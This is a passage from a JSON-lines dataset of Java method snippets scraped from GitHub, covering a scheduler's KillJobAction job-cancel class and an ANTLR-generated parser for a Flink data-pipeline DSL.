"String", "snippet": "    public String getMessage() {\n        return message;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/bean/FundRecordBean.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55999, "method_name": "processEvent", "class_name": "NewsEventListener", "params": ["ConnectionSet", "GetPoolTasksEvent"], "throws": ["Exception"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void processEvent(ConnectionSet connectionSet, GetPoolTasksEvent e) throws Exception {\n        NewsInfoEvent event = UserNewsCache.getUserEvent(connectionSet.getConnection(), e.getUser().getId());\n        e.getForm().getResponse().addEvent(event);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/event/listener/NewsEventListener.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56000, "method_name": "createFromJson", "class_name": "KillJobAction", "params": ["HashMap<String,Object>"], "throws": null, "modifiers": ["public", "static"], "return_type": "KillJobAction", "snippet": "  public static KillJobAction createFromJson(final HashMap<String, Object> obj) {\n    final Map<String, Object> jsonObj = (HashMap<String, Object>) obj;\n    final String objType = (String) jsonObj.get(\"type\");\n    if (!objType.equals(type)) {\n      throw new RuntimeException(\"Cannot create action of \" + type + \" from \"\n          + objType);\n    }\n    final String actionId = (String) jsonObj.get(\"actionId\");\n    final int execId = Integer.valueOf((String) jsonObj.get(\"execId\"));\n    final String jobId = (String) jsonObj.get(\"jobId\");\n    return new KillJobAction(actionId, execId, jobId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillJobAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 56001, "method_name": "getId", "class_name": "KillJobAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {\n    return this.actionId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillJobAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 56002, "method_name": "getType", "class_name": "KillJobAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getType() {\n    return type;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillJobAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 56003, "method_name": "fromJson", "class_name": "KillJobAction", "params": ["Object"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "KillJobAction", "snippet": "  public KillJobAction fromJson(final Object obj) throws Exception {\n    return createFromJson((HashMap<String, Object>) obj);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillJobAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 56004, "method_name": "toJson", "class_name": "KillJobAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object toJson() {\n    final Map<String, Object> jsonObj = new HashMap<>();\n    jsonObj.put(\"actionId\", this.actionId);\n    jsonObj.put(\"type\", type);\n    jsonObj.put(\"execId\", String.valueOf(this.execId));\n    jsonObj.put(\"jobId\", String.valueOf(this.jobId));\n    return jsonObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillJobAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 56005, "method_name": "doAction", "class_name": "KillJobAction", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void doAction() throws Exception {\n    logger.info(\"ready to do action \" + getDescription());\n    final FlowRunnerManager flowRunnerManager = ServiceProvider.SERVICE_PROVIDER\n        .getInstance(FlowRunnerManager.class);\n    flowRunnerManager.cancelJobBySLA(this.execId, this.jobId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillJobAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 56006, "method_name": "setContext", "class_name": "KillJobAction", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setContext(final Map<String, Object> context) {\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillJobAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 56007, "method_name": "getDescription", "class_name": "KillJobAction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getDescription() {\n    return type + \" for execution \" + this.execId + \" jobId \" + this.jobId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/action/KillJobAction.java", "stars": "18", "class_props": {"extends": null, "implements": ["TriggerAction"], "modifiers": ["public"]}}, {"id": 56008, "method_name": "makeRuleNames", "class_name": "MingBdJSONParser", "params": [], "throws": null, "modifiers": ["static", "private"], "return_type": "String", "snippet": "\tprivate static String[] makeRuleNames() {\n\t\treturn new String[] {\n\t\t\t\"json\", \"value\", \"pair\", \"runtype\", \"load\", \"join\", \"trans\", \"dataSource\", \n\t\t\t\"mysqlSource\", \"transinfo\", \"select\", \"cols\", \"col\", \"filter\", \"save\", \n\t\t\t\"saveInfo\", \"kafkaSave\", \"mysqlSave\", \"joinpair\", \"kafkaSource\", \"field\"\n\t\t};\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56009, "method_name": "makeLiteralNames", "class_name": "MingBdJSONParser", "params": [], "throws": null, "modifiers": ["static", "private"], "return_type": "String", "snippet": "\tprivate static String[] makeLiteralNames() {\n\t\treturn new String[] {\n\t\t\tnull, \"'{'\", \"','\", \"'}'\", \"'\\\"runMode\\\"'\", \"':'\", \"'\\\"stream\\\"'\", \"'\\\"batch\\\"'\", \n\t\t\t\"'\\\"load\\\"'\", \"'['\", \"']'\", \"'\\\"join\\\"'\", \"'\\\"transform\\\"'\", \"'\\\"from\\\"'\", \n\t\t\t\"'\\\"to\\\"'\", \"'\\\"distinct\\\"'\", \"'true'\", \"'false'\", \"'\\\"cols\\\"'\", \"'('\", \n\t\t\t\"')'\", \"'\\\"condition\\\"'\", \"'\\\"save\\\"'\", \"'\\\"zk\\\"'\", \"'\\\"btServers\\\"'\", \n\t\t\t\"'\\\"topic\\\"'\", \"'\\\"inputT\\\"'\", \"'\\\"conditionT\\\"'\", \"'\\\"outputT\\\"'\", \"'\\\"groupId\\\"'\", \n\t\t\t\"'\\\"schema\\\"'\", \"'\\\"tableName\\\"'\", \"'\\\"nameI\\\"'\", \"'\\\"aliasI\\\"'\"\n\t\t};\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56010, "method_name": "makeSymbolicNames", "class_name": "MingBdJSONParser", "params": [], "throws": null, "modifiers": ["static", "private"], "return_type": "String", "snippet": "\tprivate static String[] makeSymbolicNames() {\n\t\treturn new String[] {\n\t\t\tnull, null, null, null, null, null, null, null, null, null, null, null, \n\t\t\tnull, null, null, null, null, null, null, null, null, null, null, null, \n\t\t\tnull, null, null, null, null, null, null, null, null, null, \"STRING\", \n\t\t\t\"NUMBER\", \"WS\"\n\t\t};\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56011, "method_name": "getTokenNames", "class_name": "MingBdJSONParser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String[] getTokenNames() {\n\t\treturn tokenNames;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56012, "method_name": "getVocabulary", "class_name": "MingBdJSONParser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Vocabulary", "snippet": "\tpublic Vocabulary getVocabulary() {\n\t\treturn VOCABULARY;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56013, "method_name": "getGrammarFileName", "class_name": "MingBdJSONParser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getGrammarFileName() { return \"MingBdJSON.g4\"; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56014, "method_name": "getRuleNames", "class_name": "MingBdJSONParser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String[] getRuleNames() { return ruleNames; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56015, "method_name": "getSerializedATN", "class_name": "MingBdJSONParser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getSerializedATN() { return _serializedATN; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56016, "method_name": "getATN", "class_name": "MingBdJSONParser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ATN", "snippet": "\tpublic ATN getATN() { return _ATN; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56017, "method_name": "json", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "JsonContext", "snippet": "\tpublic final JsonContext json() throws RecognitionException {\n\t\tJsonContext _localctx = new JsonContext(_ctx, getState());\n\t\tenterRule(_localctx, 0, RULE_json);\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(42);\n\t\t\tvalue();\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56018, "method_name": "value", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "ValueContext", "snippet": "\tpublic final ValueContext value() throws RecognitionException {\n\t\tValueContext _localctx = new ValueContext(_ctx, getState());\n\t\tenterRule(_localctx, 2, RULE_value);\n\t\tint _la;\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(44);\n\t\t\tmatch(T__0);\n\t\t\tsetState(45);\n\t\t\tpair();\n\t\t\tsetState(50);\n\t\t\t_errHandler.sync(this);\n\t\t\t_la = _input.LA(1);\n\t\t\twhile (_la==T__1) {\n\t\t\t\t{\n\t\t\t\t{\n\t\t\t\tsetState(46);\n\t\t\t\tmatch(T__1);\n\t\t\t\tsetState(47);\n\t\t\t\tpair();\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsetState(52);\n\t\t\t\t_errHandler.sync(this);\n\t\t\t\t_la = _input.LA(1);\n\t\t\t}\n\t\t\tsetState(53);\n\t\t\tmatch(T__2);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56019, "method_name": "pair", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "PairContext", "snippet": "\tpublic final PairContext pair() throws RecognitionException {\n\t\tPairContext _localctx = new PairContext(_ctx, getState());\n\t\tenterRule(_localctx, 4, RULE_pair);\n\t\ttry {\n\t\t\tsetState(60);\n\t\t\t_errHandler.sync(this);\n\t\t\tswitch (_input.LA(1)) {\n\t\t\tcase T__3:\n\t\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t\t{\n\t\t\t\tsetState(55);\n\t\t\t\truntype();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase T__7:\n\t\t\t\tenterOuterAlt(_localctx, 2);\n\t\t\t\t{\n\t\t\t\tsetState(56);\n\t\t\t\tload();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase T__10:\n\t\t\t\tenterOuterAlt(_localctx, 3);\n\t\t\t\t{\n\t\t\t\tsetState(57);\n\t\t\t\tjoin();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase T__11:\n\t\t\t\tenterOuterAlt(_localctx, 4);\n\t\t\t\t{\n\t\t\t\tsetState(58);\n\t\t\t\ttrans();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase T__21:\n\t\t\t\tenterOuterAlt(_localctx, 5);\n\t\t\t\t{\n\t\t\t\tsetState(59);\n\t\t\t\tsave();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tthrow new NoViableAltException(this);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56020, "method_name": "runtype", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "RuntypeContext", "snippet": "\tpublic final RuntypeContext runtype() throws RecognitionException {\n\t\tRuntypeContext _localctx = new RuntypeContext(_ctx, getState());\n\t\tenterRule(_localctx, 6, RULE_runtype);\n\t\tint _la;\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(62);\n\t\t\tmatch(T__3);\n\t\t\tsetState(63);\n\t\t\tmatch(T__4);\n\t\t\tsetState(64);\n\t\t\t_la = _input.LA(1);\n\t\t\tif ( !(_la==T__5 || _la==T__6) ) {\n\t\t\t_errHandler.recoverInline(this);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tif ( _input.LA(1)==Token.EOF ) matchedEOF = true;\n\t\t\t\t_errHandler.reportMatch(this);\n\t\t\t\tconsume();\n\t\t\t}\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56021, "method_name": "load", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "LoadContext", "snippet": "\tpublic final LoadContext load() throws RecognitionException {\n\t\tLoadContext _localctx = new LoadContext(_ctx, getState());\n\t\tenterRule(_localctx, 8, RULE_load);\n\t\tint _la;\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(66);\n\t\t\tmatch(T__7);\n\t\t\tsetState(67);\n\t\t\tmatch(T__4);\n\t\t\tsetState(68);\n\t\t\tmatch(T__8);\n\t\t\tsetState(69);\n\t\t\tdataSource();\n\t\t\tsetState(74);\n\t\t\t_errHandler.sync(this);\n\t\t\t_la = _input.LA(1);\n\t\t\twhile (_la==T__1) {\n\t\t\t\t{\n\t\t\t\t{\n\t\t\t\tsetState(70);\n\t\t\t\tmatch(T__1);\n\t\t\t\tsetState(71);\n\t\t\t\tdataSource();\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsetState(76);\n\t\t\t\t_errHandler.sync(this);\n\t\t\t\t_la = _input.LA(1);\n\t\t\t}\n\t\t\tsetState(77);\n\t\t\tmatch(T__9);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56022, "method_name": "join", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "JoinContext", "snippet": "\tpublic final JoinContext join() throws RecognitionException {\n\t\tJoinContext _localctx = new JoinContext(_ctx, getState());\n\t\tenterRule(_localctx, 10, RULE_join);\n\t\tint _la;\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(79);\n\t\t\tmatch(T__10);\n\t\t\tsetState(80);\n\t\t\tmatch(T__4);\n\t\t\tsetState(81);\n\t\t\tmatch(T__8);\n\t\t\tsetState(82);\n\t\t\tjoinpair();\n\t\t\tsetState(87);\n\t\t\t_errHandler.sync(this);\n\t\t\t_la = _input.LA(1);\n\t\t\twhile (_la==T__1) {\n\t\t\t\t{\n\t\t\t\t{\n\t\t\t\tsetState(83);\n\t\t\t\tmatch(T__1);\n\t\t\t\tsetState(84);\n\t\t\t\tjoinpair();\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsetState(89);\n\t\t\t\t_errHandler.sync(this);\n\t\t\t\t_la = _input.LA(1);\n\t\t\t}\n\t\t\tsetState(90);\n\t\t\tmatch(T__9);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56023, "method_name": "trans", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "TransContext", "snippet": "\tpublic final TransContext trans() throws RecognitionException {\n\t\tTransContext _localctx = new TransContext(_ctx, getState());\n\t\tenterRule(_localctx, 12, RULE_trans);\n\t\tint _la;\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(92);\n\t\t\tmatch(T__11);\n\t\t\tsetState(93);\n\t\t\tmatch(T__4);\n\t\t\tsetState(94);\n\t\t\tmatch(T__8);\n\t\t\tsetState(95);\n\t\t\ttransinfo();\n\t\t\tsetState(100);\n\t\t\t_errHandler.sync(this);\n\t\t\t_la = _input.LA(1);\n\t\t\twhile (_la==T__1) {\n\t\t\t\t{\n\t\t\t\t{\n\t\t\t\tsetState(96);\n\t\t\t\tmatch(T__1);\n\t\t\t\tsetState(97);\n\t\t\t\ttransinfo();\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsetState(102);\n\t\t\t\t_errHandler.sync(this);\n\t\t\t\t_la = _input.LA(1);\n\t\t\t}\n\t\t\tsetState(103);\n\t\t\tmatch(T__9);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56024, "method_name": "dataSource", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "DataSourceContext", "snippet": "\tpublic final DataSourceContext dataSource() throws RecognitionException {\n\t\tDataSourceContext _localctx = new DataSourceContext(_ctx, getState());\n\t\tenterRule(_localctx, 14, RULE_dataSource);\n\t\ttry {\n\t\t\tsetState(107);\n\t\t\t_errHandler.sync(this);\n\t\t\tswitch (_input.LA(1)) {\n\t\t\tcase T__0:\n\t\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t\t{\n\t\t\t\tsetState(105);\n\t\t\t\tkafkaSource();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase T__1:\n\t\t\tcase T__9:\n\t\t\t\tenterOuterAlt(_localctx, 2);\n\t\t\t\t{\n\t\t\t\tsetState(106);\n\t\t\t\tmysqlSource();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tthrow new NoViableAltException(this);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56025, "method_name": "mysqlSource", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "MysqlSourceContext", "snippet": "\tpublic final MysqlSourceContext mysqlSource() throws RecognitionException {\n\t\tMysqlSourceContext _localctx = new MysqlSourceContext(_ctx, getState());\n\t\tenterRule(_localctx, 16, RULE_mysqlSource);\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56026, "method_name": "transinfo", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "TransinfoContext", "snippet": "\tpublic final TransinfoContext transinfo() throws RecognitionException {\n\t\tTransinfoContext _localctx = new TransinfoContext(_ctx, getState());\n\t\tenterRule(_localctx, 18, RULE_transinfo);\n\t\ttry {\n\t\t\tsetState(113);\n\t\t\t_errHandler.sync(this);\n\t\t\tswitch ( getInterpreter().adaptivePredict(_input,6,_ctx) ) {\n\t\t\tcase 1:\n\t\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t\t{\n\t\t\t\tsetState(111);\n\t\t\t\tselect();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tenterOuterAlt(_localctx, 2);\n\t\t\t\t{\n\t\t\t\tsetState(112);\n\t\t\t\tfilter();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56027, "method_name": "select", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "SelectContext", "snippet": "\tpublic final SelectContext select() throws RecognitionException {\n\t\tSelectContext _localctx = new SelectContext(_ctx, getState());\n\t\tenterRule(_localctx, 20, RULE_select);\n\t\tint _la;\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(115);\n\t\t\tmatch(T__0);\n\t\t\tsetState(116);\n\t\t\tcols();\n\t\t\tsetState(117);\n\t\t\tmatch(T__1);\n\t\t\tsetState(118);\n\t\t\tmatch(T__12);\n\t\t\tsetState(119);\n\t\t\tmatch(T__4);\n\t\t\tsetState(120);\n\t\t\tmatch(STRING);\n\t\t\tsetState(121);\n\t\t\tmatch(T__1);\n\t\t\tsetState(122);\n\t\t\tmatch(T__13);\n\t\t\tsetState(123);\n\t\t\tmatch(T__4);\n\t\t\tsetState(124);\n\t\t\tmatch(STRING);\n\t\t\tsetState(125);\n\t\t\tmatch(T__1);\n\t\t\tsetState(126);\n\t\t\tmatch(T__14);\n\t\t\tsetState(127);\n\t\t\tmatch(T__4);\n\t\t\tsetState(128);\n\t\t\t_la = _input.LA(1);\n\t\t\tif ( !(_la==T__15 || _la==T__16) ) {\n\t\t\t_errHandler.recoverInline(this);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tif ( _input.LA(1)==Token.EOF ) matchedEOF = true;\n\t\t\t\t_errHandler.reportMatch(this);\n\t\t\t\tconsume();\n\t\t\t}\n\t\t\tsetState(129);\n\t\t\tmatch(T__2);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56028, "method_name": "cols", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "ColsContext", "snippet": "\tpublic final ColsContext cols() throws RecognitionException {\n\t\tColsContext _localctx = new ColsContext(_ctx, getState());\n\t\tenterRule(_localctx, 22, RULE_cols);\n\t\tint _la;\n\t\ttry {\n\t\t\tenterOuterAlt(_localctx, 1);\n\t\t\t{\n\t\t\tsetState(131);\n\t\t\tmatch(T__17);\n\t\t\tsetState(132);\n\t\t\tmatch(T__4);\n\t\t\tsetState(133);\n\t\t\tmatch(T__8);\n\t\t\tsetState(134);\n\t\t\tcol();\n\t\t\tsetState(139);\n\t\t\t_errHandler.sync(this);\n\t\t\t_la = _input.LA(1);\n\t\t\twhile (_la==T__1) {\n\t\t\t\t{\n\t\t\t\t{\n\t\t\t\tsetState(135);\n\t\t\t\tmatch(T__1);\n\t\t\t\tsetState(136);\n\t\t\t\tcol();\n\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tsetState(141);\n\t\t\t\t_errHandler.sync(this);\n\t\t\t\t_la = _input.LA(1);\n\t\t\t}\n\t\t\tsetState(142);\n\t\t\tmatch(T__9);\n\t\t\t}\n\t\t}\n\t\tcatch (RecognitionException re) {\n\t\t\t_localctx.exception = re;\n\t\t\t_errHandler.reportError(this, re);\n\t\t\t_errHandler.recover(this, re);\n\t\t}\n\t\tfinally {\n\t\t\texitRule();\n\t\t}\n\t\treturn _localctx;\n\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "Parser", "implements": null, "modifiers": ["public"]}}, {"id": 56029, "method_name": "col", "class_name": "MingBdJSONParser", "params": [], "throws": ["RecognitionException"], "modifiers": ["final", "public"], "return_type": "ColContext", "snippet": "\tpublic final ColContext col() throws RecognitionException {\n\t\tColContext _localctx = new ColContext(_ctx, 